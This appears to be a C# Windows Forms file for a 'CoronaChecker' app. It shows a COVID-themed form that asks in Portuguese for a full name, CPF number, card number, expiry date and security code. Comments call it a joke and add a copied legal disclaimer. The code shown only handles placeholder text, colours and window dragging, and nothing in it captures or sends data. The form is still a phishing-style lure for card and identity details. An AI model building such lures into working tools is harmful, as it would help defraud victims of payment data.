using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CoronaChecker
{
    public partial class FormCorona : Form
    {
        /* THIS PROJECT IS JOKE!
        +------------------------------------------------------------------------------+
        |  [!] Legal disclaimer: Usage of afdWordpress for attacking                   |
        |  targets without prior mutual consent is illegal.                            |
        |  It is the end user's responsibility to obey all applicable                  | 
        |  local, state and federal laws.                                              |
        |  Developers assume no liability and are not responsible for any misuse or    |
        |  damage caused by this program                                               |
        +------------------------------------------------------------------------------+*/
        public FormCorona()
        {
            InitializeComponent();
        }
        private bool mouseDown;
        private Point lastLocation;

        private readonly string valueTxtName = "Nome completo";
        private readonly string valueTxtCPF = "CPF";
        private readonly string valueTxtCard = "Número do Cartão (CVV)";
        private readonly string valueTxtDateV = "Data de Validade";
        private readonly string valueTxtCVV = "Código Segurança";

        private void FormCorona_Load(object sender, EventArgs e)
        {
            SetValueTextBox(txtName, valueTxtName, panelLine2);
            SetValueTextBox(txtCPF, valueTxtCPF, panelLine3);
            SetValueTextBox(txtCard, valueTxtCard, panelLine4);
            SetValueTextBox(txtDateV, valueTxtDateV, panelLine5);
            SetValueTextBox(txtCVV, valueTxtCVV, panelLine6);
        }

        // Set Value in Property TextBox Leave
        private void SetValueTextBox(TextBox txtBox, String msg,Panel panelLine)
        {
            if (txtBox.Text.Equals(String.Empty))
            {
                txtBox.Text = msg;
                txtBox.ForeColor = ColorTranslator.FromHtml("#646464");
                panelLine.BackColor = ColorTranslator.FromHtml("#646464");

            }


        }

        // Set Value in Property TextBox Enter
        private void ValidateValueTextBox(TextBox txtBox, String msg, Panel panelLine)
        {
            if (txtBox.Text.Equals(msg))
            {
                txtBox.Clear();
                txtBox.ForeColor = Color.White;
                panelLine.BackColor = ColorTranslator.FromHtml("#870e4f");
            }
        }
        
        private void btnExit_Click(object sender, EventArgs e)
        {
            this.Close();
        }
        
        private void txtName_Enter(object sender, EventArgs e)
        {
            ValidateValueTextBox(txtName, valueTxtName,panelLine2);
        }
        
        private void txtCPF_Enter(object sender, EventArgs e)
        {
            ValidateValueTextBox(txtCPF, valueTxtCPF,panelLine3);
        }
        
        private void txtCard_Enter(object sender, EventArgs e)
        {
            ValidateValueTextBox(txtCard, valueTxtCard, panelLine4);
        }
        
        private void txtDateV_Enter(object sender, EventArgs e)
        {
            ValidateValueTextBox(txtDateV, valueTxtDateV, panelLine5);
        }
       
        private void txtCVV_Enter(object sender, EventArgs e)
        {
            ValidateValueTextBox(txtCVV, valueTxtCVV, panelLine6);
        }

        /* START movement FORM */
        private void MoveForm(object sender, MouseEventArgs e)
        {
            if (mouseDown)
            {

                this.Location = new Point((this.Location.X - lastLocation.X) + e.X, (this.Location.Y - lastLocation.Y) + e.Y);
                this.Update();

            }
        }
        
        private void panelTop_MouseDown(object sender, MouseEventArgs e)
        {
            mouseDown = true;
            lastLocation = e.Location;

        }
        
        private void panelTop_MouseUp(object sender, MouseEventArgs e)
        {
            mouseDown = false;
        }
        
        private void panelTop_MouseMove(object sender, MouseEventArgs e)
        {
            MoveForm(sender, e);
        }
        /* END movement FORM */

        private void txtName_Leave(object sender, EventArgs e)
        {
            SetValueTextBox(txtName, valueTxtName,panelLine2);
        }

        private void txtCPF_Leave(object sender, EventArgs e)
        {
            SetValueTextBox(txtCPF, valueTxtCPF, panelLine3);
        }

        private void txtCard_Leave(object sender, EventArgs e)
        {
            SetValueTextBox(txtCard, valueTxtCard, panelLine4);
        }

        private void txtDateV_Leave(object sender, EventArgs e)
        {
            SetValueTextBox(txtDateV, valueTxtDateV, panelLine5);
        }

        private void txtCVV_Leave(object sender, EventArgs e)
        {
            SetValueTextBox(txtCVV, valueTxtCVV, panelLine6);
        }
    }
}
